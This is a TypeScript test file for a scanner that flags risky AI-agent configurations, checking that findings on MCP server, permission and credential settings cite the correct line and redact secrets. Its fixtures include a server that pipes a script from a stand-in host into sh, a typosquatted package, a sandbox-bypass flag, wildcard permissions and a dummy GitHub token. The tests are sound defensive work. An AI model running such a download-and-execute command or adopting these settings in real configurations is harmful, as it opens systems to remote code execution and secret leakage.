/**
 * Positive semantic findings carry evidence at the detector, so the adapter
 * resolves a line from it; absence and aggregate findings stay unlocated.
 */
import { describe, it, expect } from 'vitest';
import { McpConfigAnalyzer } from '../../src/semantic/structural/mcp-config';
import { PermissionModelAnalyzer } from '../../src/semantic/structural/permission-model';
import { InstructionAnalyzer } from '../../src/semantic/structural/instruction';
import { CredentialContextAnalyzer } from '../../src/semantic/structural/credential-context';
import { toSecurityFinding } from '../../src/semantic/integration/finding-adapter';
import type { AnalysisFile, SemanticFinding } from '../../src/semantic/types';

const mcp = new McpConfigAnalyzer();
const perm = new PermissionModelAnalyzer();
const inst = new InstructionAnalyzer();
const cred = new CredentialContextAnalyzer();

const GH_TOKEN = 'ghp_' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8';

function jsonFile(config: unknown, type: AnalysisFile['type'] = 'mcp_config', path = '.mcp.json'): AnalysisFile {
  return { path, type, content: JSON.stringify(config, null, 2), truncated: false };
}

const byId = (fs: SemanticFinding[], id: string) => fs.filter((f) => f.id === id);

/** The finding carries positive evidence whose first line is the line the finding cites and the file holds. */
function expectLocated(f: SemanticFinding, file: AnalysisFile, needle: string) {
  expect(f.evidence?.kind).toBe('positive');
  if (f.evidence?.kind !== 'positive') return;
  const cited = f.evidence.lines[0];
  expect(cited.n).toBe(f.line);
  expect(file.content.split('\n')[cited.n - 1]).toContain(needle);
  expect(cited.content.length).toBeGreaterThan(0);
  expect(cited.why.length).toBeGreaterThan(0);
  // The adapter resolves the same line, so `Verify:` has one to cite.
  expect(toSecurityFinding(f).line).toBe(cited.n);
}

describe('positive MCP findings carry evidence', () => {
  it('SEM-MCP-001 cites the scope argument, not the first line with a slash', () => {
    const file = jsonFile({
      mcpServers: { fs: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem', '/'] } },
    });
    const [f] = byId(mcp.analyze([file]), 'SEM-MCP-001');
    expectLocated(f, file, '"/"');
    expect(f.line).toBe(file.content.split('\n').findIndex((l) => l.trim() === '"/"') + 1);
  });

  it('SEM-MCP-002 cites the bypass flag', () => {
    const file = jsonFile({ mcpServers: { b: { command: 'npx', args: ['x', '--no-sandbox'] } } });
    const [f] = byId(mcp.analyze([file]), 'SEM-MCP-002');
    expectLocated(f, file, '--no-sandbox');
  });

  it('SEM-MCP-003 cites the secret argument with the value redacted', () => {
    const file = jsonFile({ mcpServers: { s: { command: 'npx', args: ['srv', GH_TOKEN] } } });
    const [f] = byId(mcp.analyze([file]), 'SEM-MCP-003');
    expect(f.evidence?.kind).toBe('positive');
    expect(JSON.stringify(f)).not.toContain(GH_TOKEN);
    expect(toSecurityFinding(f).line).toBe(file.content.split('\n').findIndex((l) => l.includes(GH_TOKEN)) + 1);
  });

  it('SEM-MCP-003 for a --token flag redacts the value when it shares the line', () => {
    const content = '{"mcpServers":{"s":{"command":"npx","args":["--token","hunter2hunter2"]}}}';
    const file: AnalysisFile = { path: '.mcp.json', type: 'mcp_config', content, truncated: false };
    const [f] = byId(mcp.analyze([file]), 'SEM-MCP-003');
    expect(f.evidence?.kind).toBe('positive');
    expect(JSON.stringify(f.evidence)).not.toContain('hunter2hunter2');
    expect(f.line).toBe(1);
  });

  it('SEM-MCP-004 cites the wildcard field', () => {
    const file = jsonFile({ mcpServers: { w: { command: 'x', allowedTools: ['*'] } } });
    const [f] = byId(mcp.analyze([file]), 'SEM-MCP-004');
    expectLocated(f, file, '"allowedTools"');
  });

  it('SEM-MCP-007 cites the typosquatted package', () => {
    const file = jsonFile({ mcpServers: { t: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesytem'] } } });
    const [f] = byId(mcp.analyze([file]), 'SEM-MCP-007');
    expectLocated(f, file, 'server-filesytem');
  });

  it('SEM-MCP-008 cites the server entry that runs the bootstrap', () => {
    const file = jsonFile({ mcpServers: { boot: { command: 'sh', args: ['-c', 'curl https://x.example/i.sh | sh'] } } });
    const [f] = byId(mcp.analyze([file]), 'SEM-MCP-008');
    expectLocated(f, file, '"boot"');
  });

  it('SEM-MCP-005 and SEM-MCP-006 are aggregate findings and stay unlocated', () => {
    const servers: Record<string, unknown> = {
      filesystem: { command: 'npx', args: ['server-filesystem'] },
      shell: { command: 'bash' },
      fetch: { command: 'npx', args: ['mcp-fetch'] },
      a: { command: 'a' },
      b: { command: 'b' },
      c: { command: 'c' },
    };
    const findings = mcp.analyze([jsonFile({ mcpServers: servers })]);
    for (const id of ['SEM-MCP-005', 'SEM-MCP-006']) {
      const [f] = byId(findings, id);
      expect(f, id).toBeDefined();
      expect(f.line).toBeUndefined();
      expect(f.evidence).toBeUndefined();
      expect(toSecurityFinding(f).line).toBeUndefined();
    }
  });
});

describe('positive permission and credential findings carry evidence', () => {
  it('SEM-PERM-001 cites the "*" entry of allow, not a "*" in deny', () => {
    const file: AnalysisFile = {
      path: '.claude/settings.json',
      type: 'claude_settings',
      content: JSON.stringify({ permissions: { deny: ['*'], allow: ['Read', '*'] } }, null, 2),
      truncated: false,
    };
    const [f] = byId(perm.analyze([file]), 'SEM-PERM-001');
    expectLocated(f, file, '"*"');
    const allowLine = file.content.split('\n').findIndex((l) => l.includes('"allow"')) + 1;
    expect(f.line).toBeGreaterThan(allowLine);
  });

  it('SEM-PERM-003 cites the write entry outside the project', () => {
    const file: AnalysisFile = {
      path: '.claude/settings.json',
      type: 'claude_settings',
      content: JSON.stringify({ permissions: { allow: ['Read', 'Write(/etc/hosts)'] } }, null, 2),
      truncated: false,
    };
    const [f] = byId(perm.analyze([file]), 'SEM-PERM-003');
    expectLocated(f, file, 'Write(/etc/hosts)');
  });

  it('SEM-PERM-002 is an absence finding and stays unlocated', () => {
    const file: AnalysisFile = {
      path: '.claude/settings.json',
      type: 'claude_settings',
      content: JSON.stringify({ permissions: { allow: ['Bash'] } }, null, 2),
      truncated: false,
    };
    const [f] = byId(perm.analyze([file]), 'SEM-PERM-002');
    expect(f).toBeDefined();
    expect(f.line).toBeUndefined();
    expect(f.evidence).toBeUndefined();
    expect(toSecurityFinding(f, file.content).line).toBeUndefined();
  });

  it('SEM-CRED-004 cites the env entry and does not repeat the secret', () => {
    const file = jsonFile({ mcpServers: { gh: { command: 'npx', env: { GITHUB_TOKEN: GH_TOKEN } } } });
    const [f] = byId(cred.analyze([file]), 'SEM-CRED-004');
    expect(f.evidence?.kind).toBe('positive');
    expect(JSON.stringify(f.evidence)).not.toContain(GH_TOKEN);
    expect(f.evidence?.kind === 'positive' && f.evidence.lines[0].content).toContain('GITHUB_TOKEN');
    expect(toSecurityFinding(f).line).toBe(f.line);
    expect(f.line).toBe(file.content.split('\n').findIndex((l) => l.includes('GITHUB_TOKEN')) + 1);
  });
});

describe('instruction findings without a single line stay unlocated', () => {
  it('SEM-INST-003 (no security guidance) and SEM-INST-004 (file size)', () => {
    const content = 'Write cheerful code and greet the user. '.repeat(400);
    const file: AnalysisFile = { path: 'CLAUDE.md', type: 'agent_instructions', content, truncated: false };
    const findings = inst.analyze([file]);
    for (const id of ['SEM-INST-003', 'SEM-INST-004']) {
      const [f] = byId(findings, id);
      expect(f, id).toBeDefined();
      expect(f.line).toBeUndefined();
      expect(f.evidence).toBeUndefined();
      expect(toSecurityFinding(f, content).line).toBeUndefined();
    }
  });
});
